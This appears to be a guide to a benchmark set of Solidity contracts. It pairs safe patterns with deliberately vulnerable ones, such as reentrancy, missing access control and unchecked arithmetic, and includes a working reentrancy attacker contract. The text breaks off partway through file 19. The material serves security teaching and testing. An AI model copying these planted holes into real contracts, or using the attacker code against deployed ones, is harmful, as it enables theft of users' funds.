COMPLETE IMPLEMENTATION GUIDE
Directory Structure
public/baselines/
├── metadata.json
├── README.md
├── solidity/
│ ├── security/ (8 contracts)
│ ├── tokens/ (6 contracts)
│ ├── math/ (3 contracts)
│ ├── gas/ (3 contracts)
│ ├── defi/ (12 contracts - includes 4 new ERC4626 attacks)
│ ├── bridge/ (3 contracts - NEW)
│ ├── upgrades/ (5 contracts)
│ ├── advanced/ (6 contracts)
│ └── exploits/ (8 contracts)
└── rust/
├── anchor/ (7 contracts)
└── substrate/ (6 contracts)

🔒 TIER 1: CORE SECURITY PATTERNS (1-20)

FILE: public/baselines/solidity/security/01-reentrancy-safe.sol
solidity// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/\*\*

- @title Reentrancy Safe Pattern
- @notice BASELINE: OpenZeppelin ReentrancyGuard pattern
- @dev Score: 100/100 (perfect implementation)
-
- KEY PATTERN: State update BEFORE external call
- This is the gold standard for preventing reentrancy attacks.
-
- METADATA:
- - Category: security
- - Tier: core
- - Safe: true
- - Immunefi Level: N/A (this is the safe pattern)
- - Tags: ["fundamental", "required", "checks-effects-interactions"]
    \*/
    contract ReentrancySafe {
    mapping(address => uint256) public balances;
        event Deposit(address indexed user, uint256 amount);
        event Withdrawal(address indexed user, uint256 amount);

        function deposit() public payable {
            require(msg.value > 0, "Deposit amount must be > 0");
            balances[msg.sender] += msg.value;
            emit Deposit(msg.sender, msg.value);
        }

        /**
         * @notice SAFE: Follows checks-effects-interactions pattern
         * @dev State is updated BEFORE external call
         */
        function withdraw(uint256 amount) public {
            // CHECKS
            require(amount > 0, "Withdrawal amount must be > 0");
            require(balances[msg.sender] >= amount, "Insufficient balance");

            // EFFECTS (state update FIRST)
            balances[msg.sender] -= amount;

            // INTERACTIONS (external call LAST)
            (bool success, ) = msg.sender.call{value: amount}("");
            require(success, "Transfer failed");

            emit Withdrawal(msg.sender, amount);
        }

        function getBalance(address user) public view returns (uint256) {
            return balances[user];
        }

        receive() external payable {
            deposit();
        }
    }

FILE: public/baselines/solidity/security/02-reentrancy-vulnerable.sol
solidity// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/\*\*

- @title Reentrancy Vulnerable (THE DAO Pattern)
- @notice BASELINE: Classic reentrancy vulnerability
- @dev Score: 0/100 (vulnerable)
-
- ANTI-PATTERN: External call BEFORE state update
- This is the exact pattern from The DAO hack (2016, $60M loss)
-
- METADATA:
- - Category: security
- - Tier: core
- - Safe: false
- - Immunefi Level: 5 (Critical)
- - Historical Exploit: The DAO (2016)
- - Tags: ["vulnerable", "educational", "reentrancy"]
    \*/
    contract ReentrancyVulnerable {
    mapping(address => uint256) public balances;
        event Deposit(address indexed user, uint256 amount);
        event Withdrawal(address indexed user, uint256 amount);

        function deposit() public payable {
            balances[msg.sender] += msg.value;
            emit Deposit(msg.sender, msg.value);
        }

        /**
         * @notice VULNERABLE: External call before state update
         * @dev Attacker can re-enter and drain funds
         *
         * EXPLOIT FLOW:
         * 1. Attacker calls withdraw(1 ETH)
         * 2. Contract sends 1 ETH to attacker
         * 3. Attacker's receive() is triggered
         * 4. Attacker re-enters withdraw(1 ETH) BEFORE balance is updated
         * 5. Repeat until contract drained
         */
        function withdraw(uint256 amount) public {
            require(balances[msg.sender] >= amount, "Insufficient balance");

            // VULNERABILITY: External call BEFORE state update
            (bool success, ) = msg.sender.call{value: amount}("");
            require(success, "Transfer failed");

            // State update happens AFTER external call (TOO LATE)
            balances[msg.sender] -= amount;

            emit Withdrawal(msg.sender, amount);
        }

        receive() external payable {
            deposit();
        }
    }

/\*\*

- @title Attacker Contract
- @notice Demonstrates exploitation of reentrancy vulnerability
  \*/
  contract ReentrancyAttacker {
  ReentrancyVulnerable public victim;
  uint256 public constant ATTACK_AMOUNT = 1 ether;
  address public owner;
      constructor(address _victim) {
          victim = ReentrancyVulnerable(_victim);
          owner = msg.sender;
      }

      function attack() external payable {
          require(msg.value >= ATTACK_AMOUNT, "Need at least 1 ETH");
          victim.deposit{value: ATTACK_AMOUNT}();
          victim.withdraw(ATTACK_AMOUNT);
      }

      receive() external payable {
          if (address(victim).balance >= ATTACK_AMOUNT) {
              victim.withdraw(ATTACK_AMOUNT);
          }
      }

      function withdraw() external {
          require(msg.sender == owner);
          payable(owner).transfer(address(this).balance);
      }
  }

FILE: public/baselines/solidity/security/03-access-control-ownable.sol
solidity// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/\*\*

- @title Ownable Pattern
- @notice BASELINE: OpenZeppelin Ownable pattern
- @dev Score: 100/100 (perfect access control)
-
- METADATA:
- - Category: security
- - Tier: core
- - Safe: true
- - Source: OpenZeppelin
- - Tags: ["fundamental", "access-control"]
    \*/
    contract OwnablePattern {
    address public owner;
        event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

        modifier onlyOwner() {
            require(msg.sender == owner, "Caller is not the owner");
            _;
        }

        constructor() {
            owner = msg.sender;
            emit OwnershipTransferred(address(0), msg.sender);
        }

        function transferOwnership(address newOwner) public onlyOwner {
            require(newOwner != address(0), "New owner cannot be zero address");
            emit OwnershipTransferred(owner, newOwner);
            owner = newOwner;
        }

        function criticalAction() public onlyOwner {
            // Privileged operation
        }

        function withdrawAll() public onlyOwner {
            payable(owner).transfer(address(this).balance);
        }

        receive() external payable {}
    }

FILE: public/baselines/solidity/security/04-access-control-missing.sol
solidity// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/\*\*

- @title Missing Access Control
- @notice BASELINE: Common vulnerability - missing access control
- @dev Score: 0/100 (vulnerable)
-
- METADATA:
- - Category: security
- - Tier: core
- - Safe: false
- - Immunefi Level: 5 (Critical)
- - Common Finding: 20% of Immunefi reports
    \*/
    contract AccessControlMissing {
    address public owner;
    uint256 public fee;
    bool public paused;
        constructor() {
            owner = msg.sender;
            fee = 10;
        }

        /**
         * @notice VULNERABLE: No access control - anyone can become owner!
         */
        function setOwner(address newOwner) public {
            owner = newOwner;
        }

        /**
         * @notice VULNERABLE: Anyone can drain the contract
         */
        function withdrawAll() public {
            payable(msg.sender).transfer(address(this).balance);
        }

        /**
         * @notice VULNERABLE: Anyone can change fee to 0 or 100%
         */
        function setFee(uint256 newFee) public {
            fee = newFee;
        }

        /**
         * @notice VULNERABLE: Anyone can pause
         */
        function setPaused(bool _paused) public {
            paused = _paused;
        }

        receive() external payable {}
    }

FILE: public/baselines/solidity/security/05-external-call-safe.sol
solidity// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/\*\*

- @title Safe External Call Handling
- @notice BASELINE: Proper external call patterns
- @dev Score: 100/100
-
- METADATA:
- - Category: security
- - Tier: core
- - Safe: true
- - Tags: ["external-calls", "error-handling"]
    \*/
    contract SafeExternalCall {
        event TransferSuccess(address to, uint256 amount);
        event TransferFailed(address to, uint256 amount);

        /**
         * @notice SAFE: Checks return value of low-level call
         */
        function safeCallTransfer(address payable recipient, uint256 amount) public {
            (bool success, ) = recipient.call{value: amount}("");
            require(success, "Transfer failed");
            emit TransferSuccess(recipient, amount);
        }

        /**
         * @notice SAFE: Uses transfer() which reverts on failure
         */
        function saferTransfer(address payable recipient, uint256 amount) public {
            recipient.transfer(amount);
            emit TransferSuccess(recipient, amount);
        }

        /**
         * @notice SAFE: Batch transfers with proper error handling
         */
        function batchTransfer(address payable[] memory recipients, uint256[] memory amounts) public {
            require(recipients.length == amounts.length, "Length mismatch");

            for (uint256 i = 0; i < recipients.length; i++) {
                (bool success, ) = recipients[i].call{value: amounts[i]}("");
                if (success) {
                    emit TransferSuccess(recipients[i], amounts[i]);
                } else {
                    emit TransferFailed(recipients[i], amounts[i]);
                }
            }
        }

        /**
         * @notice SAFE: Try-catch for contract calls
         */
        function safeContractCall(address target, bytes memory data) public returns (bool) {
            (bool success, ) = target.call(data);
            return success;
        }

        receive() external payable {}
    }

FILE: public/baselines/solidity/security/06-pausable-pattern.sol
solidity// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/\*\*

- @title Pausable Pattern
- @notice BASELINE: OpenZeppelin Pausable pattern
- @dev Emergency stop mechanism
-
- METADATA:
- - Category: security
- - Tier: core
- - Safe: true
- - Source: OpenZeppelin
    \*/
    contract PausablePattern {
    address public owner;
    bool public paused;
        event Paused(address account);
        event Unpaused(address account);

        modifier onlyOwner() {
            require(msg.sender == owner, "Not owner");
            _;
        }

        modifier whenNotPaused() {
            require(!paused, "Contract is paused");
            _;
        }

        modifier whenPaused() {
            require(paused, "Contract is not paused");
            _;
        }

        constructor() {
            owner = msg.sender;
            paused = false;
        }

        function pause() public onlyOwner whenNotPaused {
            paused = true;
            emit Paused(msg.sender);
        }

        function unpause() public onlyOwner whenPaused {
            paused = false;
            emit Unpaused(msg.sender);
        }

        function criticalOperation() public whenNotPaused {
            // Can be paused in emergency
        }

        function deposit() public payable whenNotPaused {
            // Protected operation
        }
    }

FILE: public/baselines/solidity/security/07-pull-payment-safe.sol
solidity// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/\*\*

- @title Pull Payment Pattern
- @notice BASELINE: Safe payment distribution pattern
- @dev Prevents DoS and reentrancy issues
-
- KEY PATTERN: Let users withdraw (pull) instead of sending (push)
-
- METADATA:
- - Category: security
- - Tier: core
- - Safe: true
- - Tags: ["pull-pattern", "anti-dos"]
    \*/
    contract PullPaymentSafe {
    mapping(address => uint256) public pendingWithdrawals;
        event PaymentDeposited(address indexed payee, uint256 amount);
        event PaymentWithdrawn(address indexed payee, uint256 amount);

        /**
         * @notice SAFE: Accumulate payments for users
         * @dev No external calls, just accounting
         */
        function depositPayment(address payee) public payable {
            require(msg.value > 0, "Payment must be > 0");
            pendingWithdrawals[payee] += msg.value;
            emit PaymentDeposited(payee, msg.value);
        }

        /**
         * @notice SAFE: Users pull their own payments
         * @dev Follows checks-effects-interactions
         */
        function withdraw() public {
            uint256 amount = pendingWithdrawals[msg.sender];
            require(amount > 0, "No pending payments");

            // EFFECTS: Update state first
            pendingWithdrawals[msg.sender] = 0;

            // INTERACTIONS: Transfer last
            (bool success, ) = msg.sender.call{value: amount}("");
            require(success, "Transfer failed");

            emit PaymentWithdrawn(msg.sender, amount);
        }

        function getPendingPayment(address payee) public view returns (uint256) {
            return pendingWithdrawals[payee];
        }
    }

FILE: public/baselines/solidity/security/08-multisig-wallet.sol
solidity// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/\*\*

- @title Simple Multisig Wallet
- @notice BASELINE: Basic multisig pattern
- @dev Requires M-of-N signatures for execution
-
- METADATA:
- - Category: security
- - Tier: core
- - Safe: true
- - Tags: ["multisig", "governance"]
    \*/
    contract MultiSigWallet {
    address[] public owners;
    uint256 public required;
    uint256 public transactionCount;
        mapping(uint256 => Transaction) public transactions;
        mapping(uint256 => mapping(address => bool)) public confirmations;

        struct Transaction {
            address to;
            uint256 value;
            bytes data;
            bool executed;
            uint256 confirmationCount;
        }

        event Submission(uint256 indexed transactionId);
        event Confirmation(address indexed sender, uint256 indexed transactionId);
        event Execution(uint256 indexed transactionId);

        modifier onlyOwner() {
            bool isOwner = false;
            for (uint256 i = 0; i < owners.length; i++) {
                if (owners[i] == msg.sender) {
                    isOwner = true;
                    break;
                }
            }
            require(isOwner, "Not an owner");
            _;
        }

        modifier notExecuted(uint256 transactionId) {
            require(!transactions[transactionId].executed, "Already executed");
            _;
        }

        constructor(address[] memory _owners, uint256 _required) {
            require(_owners.length > 0, "Owners required");
            require(_required > 0 && _required <= _owners.length, "Invalid required");

            owners = _owners;
            required = _required;
        }

        function submitTransaction(address to, uint256 value, bytes memory data)
            public
            onlyOwner
            returns (uint256)
        {
            uint256 transactionId = transactionCount++;
            transactions[transactionId] = Transaction({
                to: to,
                value: value,
                data: data,
                executed: false,
                confirmationCount: 0
            });
            emit Submission(transactionId);
            confirmTransaction(transactionId);
            return transactionId;
        }

        function confirmTransaction(uint256 transactionId)
            public
            onlyOwner
            notExecuted(transactionId)
        {
            require(!confirmations[transactionId][msg.sender], "Already confirmed");

            confirmations[transactionId][msg.sender] = true;
            transactions[transactionId].confirmationCount++;
            emit Confirmation(msg.sender, transactionId);

            if (transactions[transactionId].confirmationCount >= required) {
                executeTransaction(transactionId);
            }
        }

        function executeTransaction(uint256 transactionId)
            public
            notExecuted(transactionId)
        {
            Transaction storage txn = transactions[transactionId];
            require(txn.confirmationCount >= required, "Not enough confirmations");

            txn.executed = true;
            (bool success, ) = txn.to.call{value: txn.value}(txn.data);
            require(success, "Execution failed");

            emit Execution(transactionId);
        }

        receive() external payable {}
    }

TOKEN STANDARDS (9-14)
FILE: public/baselines/solidity/tokens/09-erc20-safe.sol
solidity// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/\*\*

- @title ERC20 Safe Implementation
- @notice BASELINE: OpenZeppelin ERC20 standard
- @dev Score: 100/100
-
- METADATA:
- - Category: tokens
- - Tier: core
- - Safe: true
- - Standard: ERC20
- - Source: OpenZeppelin
    \*/
    contract ERC20Safe {
    string public name = "SafeToken";
    string public symbol = "SAFE";
    uint8 public decimals = 18;
    uint256 public totalSupply;
        mapping(address => uint256) public balanceOf;
        mapping(address => mapping(address => uint256)) public allowance;

        event Transfer(address indexed from, address indexed to, uint256 value);
        event Approval(address indexed owner, address indexed spender, uint256 value);

        constructor(uint256 initialSupply) {
            totalSupply = initialSupply * 10**decimals;
            balanceOf[msg.sender] = totalSupply;
        }

        /**
         * @notice SAFE: All checks present
         */
        function transfer(address to, uint256 amount) public returns (bool) {
            require(to != address(0), "Transfer to zero address");
            require(balanceOf[msg.sender] >= amount, "Insufficient balance");

            balanceOf[msg.sender] -= amount;
            balanceOf[to] += amount;

            emit Transfer(msg.sender, to, amount);
            return true;
        }

        /**
         * @notice SAFE: Standard approve implementation
         */
        function approve(address spender, uint256 amount) public returns (bool) {
            require(spender != address(0), "Approve to zero address");

            allowance[msg.sender][spender] = amount;
            emit Approval(msg.sender, spender, amount);
            return true;
        }

        /**
         * @notice SAFE: Proper allowance checks
         */
        function transferFrom(address from, address to, uint256 amount) public returns (bool) {
            require(to != address(0), "Transfer to zero address");
            require(balanceOf[from] >= amount, "Insufficient balance");
            require(allowance[from][msg.sender] >= amount, "Insufficient allowance");

            balanceOf[from] -= amount;
            balanceOf[to] += amount;
            allowance[from][msg.sender] -= amount;

            emit Transfer(from, to, amount);
            return true;
        }

        /**
         * @notice SAFE: Prevents approval race condition
         */
        function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
            allowance[msg.sender][spender] += addedValue;
            emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
            return true;
        }

        function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
            require(allowance[msg.sender][spender] >= subtractedValue, "Decreased below zero");
            allowance[msg.sender][spender] -= subtractedValue;
            emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
            return true;
        }
    }

FILE: public/baselines/solidity/tokens/10-erc20-unsafe-approval.sol
solidity// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/\*\*

- @title ERC20 with Approval Race Condition
- @notice BASELINE: Classic approve() vulnerability
- @dev Score: 30/100 (has race condition)
-
- VULNERABILITY: Approval can be front-run
-
- METADATA:
- - Category: tokens
- - Tier: core
- - Safe: false
- - Immunefi Level: 3 (Medium)
- - Tags: ["front-running", "approval-race"]
    \*/
    contract ERC20UnsafeApproval {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
        event Approval(address indexed owner, address indexed spender, uint256 value);
        event Transfer(address indexed from, address indexed to, uint256 value);

        /**
         * @notice VULNERABLE: approve() race condition
         * @dev Attacker can front-run and spend old + new allowance
         *
         * EXPLOIT:
         * 1. Alice approves Bob for 100 tokens
         * 2. Alice changes approval to 50 tokens
         * 3. Bob sees pending tx, front-runs with transferFrom(100)
         * 4. Bob's tx executes, spends 100
         * 5. Alice's approve(50) executes
         * 6. Bob calls transferFrom(50) again
         * 7. Bob spent 150 tokens instead of 50
         */
        function approve(address spender, uint256 amount) public returns (bool) {
            allowance[msg.sender][spender] = amount;
            emit Approval(msg.sender, spender, amount);
            return true;
        }

        function transferFrom(address from, address to, uint256 amount) public returns (bool) {
            require(allowance[from][msg.sender] >= amount, "Insufficient allowance");
            require(balanceOf[from] >= amount, "Insufficient balance");

            allowance[from][msg.sender] -= amount;
            balanceOf[from] -= amount;
            balanceOf[to] += amount;

            emit Transfer(from, to, amount);
            return true;
        }

        // SAFE ALTERNATIVE: Use increaseAllowance/decreaseAllowance
        // (see erc20-safe.sol)
    }

FILE: public/baselines/solidity/tokens/11-erc721-safe.sol
solidity// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/\*\*

- @title ERC721 Safe Implementation
- @notice BASELINE: Simplified OpenZeppelin ERC721
-
- METADATA:
- - Category: tokens
- - Tier: core
- - Safe: true
- - Standard: ERC721
    \*/
    contract ERC721Safe {
    string public name = "SafeNFT";
    string public symbol = "SNFT";
    uint256 private \_tokenIdCounter;
        mapping(uint256 => address) public ownerOf;
        mapping(address => uint256) public balanceOf;
        mapping(uint256 => address) public getApproved;
        mapping(address => mapping(address => bool)) public isApprovedForAll;

        event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
        event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
        event ApprovalForAll(address indexed owner, address indexed operator, bool approved);

        function mint(address to) public {
            require(to != address(0), "Mint to zero address");

            uint256 tokenId = _tokenIdCounter++;
            ownerOf[tokenId] = to;
            balanceOf[to]++;

            emit Transfer(address(0), to, tokenId);
        }

        /**
         * @notice SAFE: All checks present
         */
        function transferFrom(address from, address to, uint256 tokenId) public {
            require(from == ownerOf[tokenId], "From is not owner");
            require(to != address(0), "Transfer to zero address");
            require(
                msg.sender == from ||
                getApproved[tokenId] == msg.sender ||
                isApprovedForAll[from][msg.sender],
                "Not authorized"
            );

            // Clear approval
            delete getApproved[tokenId];

            // Update balances
            balanceOf[from]--;
            balanceOf[to]++;

            // Transfer ownership
            ownerOf[tokenId] = to;

            emit Transfer(from, to, tokenId);
        }

        function approve(address to, uint256 tokenId) public {
            address owner = ownerOf[tokenId];
            require(msg.sender == owner || isApprovedForAll[owner][msg.sender], "Not authorized");

            getApproved[tokenId] = to;
            emit Approval(owner, to, tokenId);
        }

        function setApprovalForAll(address operator, bool approved) public {
            isApprovedForAll[msg.sender][operator] = approved;
            emit ApprovalForAll(msg.sender, operator, approved);
        }

        function safeTransferFrom(address from, address to, uint256 tokenId) public {
            transferFrom(from, to, tokenId);
            // In production, check if 'to' is contract and call onERC721Received
        }
    }

FILE: public/baselines/solidity/tokens/12-erc20-mintable-safe.sol
solidity// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/\*\*

- @title Mintable Token (Safe)
- @notice BASELINE: Token with access-controlled minting
-
- METADATA:
- - Category: tokens
- - Tier: core
- - Safe: true
- - Tags: ["mintable", "access-control"]
    \*/
    contract MintableTokenSafe {
    string public name = "MintableToken";
    string public symbol = "MINT";
    uint8 public decimals = 18;
    uint256 public totalSupply;
        address public owner;
        mapping(address => uint256) public balanceOf;

        event Transfer(address indexed from, address indexed to, uint256 value);
        event Mint(address indexed to, uint256 amount);

        modifier onlyOwner() {
            require(msg.sender == owner, "Not owner");
            _;
        }

        constructor() {
            owner = msg.sender;
        }

        /**
         * @notice SAFE: Minting protected by onlyOwner
         * @dev Solidity 0.8+ has automatic overflow checks
         */
        function mint(address to, uint256 amount) public onlyOwner {
            require(to != address(0), "Mint to zero address");

            balanceOf[to] += amount;
            totalSupply += amount;

            emit Transfer(address(0), to, amount);
            emit Mint(to, amount);
        }

        function transfer(address to, uint256 amount) public returns (bool) {
            require(to != address(0), "Transfer to zero address");
            require(balanceOf[msg.sender] >= amount, "Insufficient balance");

            balanceOf[msg.sender] -= amount;
            balanceOf[to] += amount;

            emit Transfer(msg.sender, to, amount);
            return true;
        }
    }

FILE: public/baselines/solidity/tokens/13-erc20-fee-on-transfer.sol
solidity// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/\*\*

- @title Fee-on-Transfer Token Handling
- @notice BASELINE: How to handle tokens that take fees on transfer
- @dev Some tokens (e.g., SAFEMOON) deduct fees during transfer
-
- METADATA:
- - Category: tokens
- - Tier: core
- - Safe: mixed (shows both vulnerable and safe patterns)
- - Immunefi Level: 3 (Medium) if not handled
    \*/

interface IERC20 {
function balanceOf(address account) external view returns (uint256);
function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

contract FeeOnTransferHandler {
mapping(address => uint256) public userDeposits;

    /**
     * @notice VULNERABLE: Assumes full amount received
     * @dev If token takes 10% fee, only 90% actually received but user credited for 100%
     */
    function depositVulnerable(address token, uint256 amount) public {
        IERC20(token).transferFrom(msg.sender, address(this), amount);
        userDeposits[msg.sender] += amount;  // WRONG: credited more than received
    }

    /**
     * @notice SAFE: Checks actual received amount
     */
    function depositSafe(address token, uint256 amount) public returns (uint256) {
        uint256 balanceBefore = IERC20(token).balanceOf(address(this));

        IERC20(token).transferFrom(msg.sender, address(this), amount);

        uint256 balanceAfter = IERC20(token).balanceOf(address(this));
        uint256 actualReceived = balanceAfter - balanceBefore;

        // Credit user for actual amount received
        userDeposits[msg.sender] += actualReceived;

        return actualReceived;
    }

    function withdraw(address token, uint256 amount) public {
        require(userDeposits[msg.sender] >= amount, "Insufficient balance");
        userDeposits[msg.sender] -= amount;
        IERC20(token).transferFrom(address(this), msg.sender, amount);
    }

}

FILE: public/baselines/solidity/tokens/14-erc20-unchecked-transfer.sol
solidity// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/\*\*

- @title Unchecked ERC20 Transfer
- @notice BASELINE: Common bug - not checking transfer return value
- @dev Some tokens (USDT, BNB) don't return bool
-
- METADATA:
- - Category: tokens
- - Tier: core
- - Safe: false
- - Immunefi Level: 4 (High)
- - Common Finding: 20% of DeFi bugs
    \*/

interface IERC20 {
function transfer(address to, uint256 amount) external returns (bool);
function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

contract UncheckedTransfer {

    /**
     * @notice VULNERABLE: Doesn't check return value
     * @dev If transfer fails (returns false), function continues silently
     */
    function withdrawVulnerable(address token, address to, uint256 amount) public {
        IERC20(token).transfer(to, amount);
        // If transfer fails, we don't know!
        // Contract thinks tokens were sent but they weren't
    }

    /**
     * @notice SAFE: Checks return value
     */
    function withdrawSafe(address token, address to, uint256 amount) public {
        bool success = IERC20(token).transfer(to, amount);
        require(success, "Transfer failed");
    }

    /**
     * @notice BEST: Use SafeERC20 library
     * @dev Handles tokens with no return value (USDT, BNB)
     */
    function withdrawBest(address token, address to, uint256 amount) public {
        // In production, use: SafeERC20.safeTransfer(IERC20(token), to, amount);
        // SafeERC20 handles:
        // - Tokens that return bool
        // - Tokens that don't return anything
        // - Tokens that revert on failure

        (bool success, bytes memory data) = token.call(
            abi.encodeWithSelector(IERC20.transfer.selector, to, amount)
        );
        require(
            success && (data.length == 0 || abi.decode(data, (bool))),

"Transfer failed"
);
}
}

---

## MATH & INTEGER SAFETY (15-17)

## FILE: public/baselines/solidity/math/15-safe-math-08.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title Safe Math (Solidity 0.8+)
 * @notice BASELINE: Automatic overflow checks in Solidity 0.8+
 * @dev Score: 100/100
 *
 * METADATA:
 * - Category: math
 * - Tier: core
 * - Safe: true
 * - Tags: ["overflow-protection", "solidity-0.8"]
 */
contract SafeMath08 {
    uint256 public value;

    event ValueChanged(uint256 newValue);

    /**
     * @notice SAFE: Overflow reverts automatically in 0.8+
     */
    function add(uint256 amount) public {
        value += amount;  // Reverts on overflow
        emit ValueChanged(value);
    }

    /**
     * @notice SAFE: Underflow reverts automatically
     */
    function subtract(uint256 amount) public {
        value -= amount;  // Reverts on underflow
        emit ValueChanged(value);
    }

    /**
     * @notice SAFE: Multiplication overflow reverts
     */
    function multiply(uint256 factor) public {
        value *= factor;  // Reverts on overflow
        emit ValueChanged(value);
    }

    /**
     * @notice SAFE: Division by zero reverts
     */
    function divide(uint256 divisor) public {
        value /= divisor;  // Reverts if divisor == 0
        emit ValueChanged(value);
    }
}
```

---

## FILE: public/baselines/solidity/math/16-unsafe-math-07.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;  // Pre-0.8.0

/**
 * @title Unsafe Math (Solidity < 0.8.0)
 * @notice BASELINE: Integer overflow vulnerability
 * @dev Score: 0/100 (vulnerable)
 *
 * VULNERABILITY: Arithmetic wraps around silently
 *
 * METADATA:
 * - Category: math
 * - Tier: core
 * - Safe: false
 * - Immunefi Level: 5 (Critical in some contexts)
 * - Historical: BEC Token overflow (2018)
 */
contract UnsafeMath07 {
    uint256 public value;

    /**
     * @notice VULNERABLE: Silent overflow
     * @dev If value = 2^256 - 1, adding 1 wraps to 0
     */
    function add(uint256 amount) public {
        value += amount;  // Can overflow silently
    }

    /**
     * @notice VULNERABLE: Silent underflow
     * @dev If value = 0, subtracting 1 wraps to 2^256 - 1
     */
    function subtract(uint256 amount) public {
        value -= amount;  // Can underflow silently
    }

    /**
     * @notice VULNERABLE: Multiplication overflow
     */
    function multiply(uint256 factor) public {
        value *= factor;  // Can overflow silently
    }

    // SAFE ALTERNATIVE: Use SafeMath library (OpenZeppelin)
    // Or upgrade to Solidity 0.8+
}
```

---

## FILE: public/baselines/solidity/math/17-unchecked-block.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title Unchecked Block (Intentional Overflow)
 * @notice BASELINE: When you NEED overflow (rare)
 * @dev Score: 50/100 (risky but intentional)
 *
 * METADATA:
 * - Category: math
 * - Tier: core
 * - Safe: conditional (must understand implications)
 * - Tags: ["gas-optimization", "intentional-overflow"]
 */
contract UncheckedArithmetic {
    uint256 public counter;
    uint256 public sum;

    /**
     * @notice RISKY: unchecked disables overflow protection
     * @dev Use ONLY when you understand the implications
     * Common use case: counter that's allowed to wrap
     */
    function incrementUnchecked() public {
        unchecked {
            counter++;  // Can overflow without reverting
            // Gas savings: ~20-30 gas per operation
        }
    }

    /**
     * @notice SAFE: Default behavior
     */
    function incrementSafe() public {
        counter++;  // Reverts on overflow
    }

    /**
     * @notice DANGEROUS: Unchecked arithmetic on user funds
     * @dev This is almost never safe for financial calculations
     */
    function addUnchecked(uint256 amount) public {
        unchecked {
            sum += amount;  // DANGEROUS: Can overflow and lose funds
        }
    }

    /**
     * @notice SAFE: Checked arithmetic for user funds
     */
    function addSafe(uint256 amount) public {
        sum += amount;  // Always use checked for financial calculations
    }
}
```

---

## GAS OPTIMIZATION & DOS (18-20)

## FILE: public/baselines/solidity/gas/18-dos-unbounded-loop.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title DoS via Unbounded Loop
 * @notice BASELINE: Classic gas DoS vulnerability
 * @dev Score: 0/100 (vulnerable)
 *
 * METADATA:
 * - Category: gas
 * - Tier: core
 * - Safe: false
 * - Immunefi Level: 3 (Medium)
 * - Common Finding: 8% of Immunefi reports
 */
contract DosUnboundedLoop {
    address[] public recipients;
    uint256 public rewardPerRecipient = 1 ether;

    event RecipientAdded(address recipient);
    event RewardDistributed(address recipient, uint256 amount);

    function addRecipient(address recipient) public {
        recipients.push(recipient);
        emit RecipientAdded(recipient);
    }

    /**
     * @notice VULNERABLE: Unbounded loop
     * @dev If recipients.length > ~500-1000, likely out of gas
     *
     * EXPLOIT:
     * 1. Attacker adds 10,000 recipients
     * 2. distributeRewards() tries to loop through all
     * 3. Runs out of gas, function always fails
     * 4. Rewards can never be distributed (DoS)
     */
    function distributeRewardsVulnerable() public {
        for (uint256 i = 0; i < recipients.length; i++) {
            payable(recipients[i]).transfer(rewardPerRecipient);
            emit RewardDistributed(recipients[i], rewardPerRecipient);
        }
    }

    /**
     * @notice SAFE: Batch processing with limits
     * @dev Process in chunks to avoid gas limit
     */
    function distributeBatch(uint256 startIndex, uint256 count) public {
        uint256 end = startIndex + count;
        require(end <= recipients.length, "Out of bounds");
        require(count <= 100, "Batch too large");  // Max 100 per tx

        for (uint256 i = startIndex; i < end; i++) {
            payable(recipients[i]).transfer(rewardPerRecipient);
            emit RewardDistributed(recipients[i], rewardPerRecipient);
        }
    }

    /**
     * @notice BETTER: Pull payment pattern
     * @dev Let users claim their own rewards
     */
    mapping(address => uint256) public pendingRewards;

    function markRewardsReady() public {
        for (uint256 i = 0; i < recipients.length; i++) {
            pendingRewards[recipients[i]] = rewardPerRecipient;
        }
    }

    function claimReward() public {
        uint256 reward = pendingRewards[msg.sender];
        require(reward > 0, "No reward");
        pendingRewards[msg.sender] = 0;
        payable(msg.sender).transfer(reward);
    }

    receive() external payable {}
}
```

---

## FILE: public/baselines/solidity/gas/19-efficient-storage.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title Efficient Storage Patterns
 * @notice BASELINE: Gas-efficient storage layout
 * @dev Score: 100/100
 *
 * METADATA:
 * - Category: gas
 * - Tier: core
 * - Safe: true
 * - Tags: ["gas-optimization", "storage-packing"]
 */
contract EfficientStorage {

    // EFFICIENT: Variables packed into same slot (saves ~20k gas on deployment)
    uint128 public value1;  // Slot 0 (first 16 bytes)
    uint128 public value2;  // Slot 0 (last 16 bytes)

    // EFFICIENT: Smaller types packed together
    uint64 public timestamp;   // Slot 1 (first 8 bytes)
    uint64 public counter;     // Slot 1 (next 8 bytes)
    uint64 public id;          // Slot 1 (next 8 bytes)
    uint64 public flags;       // Slot 1 (last 8 bytes)

    // LESS EFFICIENT: Each takes full slot
    // uint256 public value1;  // Slot 0
    // uint256 public value2;  // Slot 1

    /**
     * @notice EFFICIENT: Mappings over arrays when possible
     * @dev Mappings don't need iteration, cheaper for lookups
     */
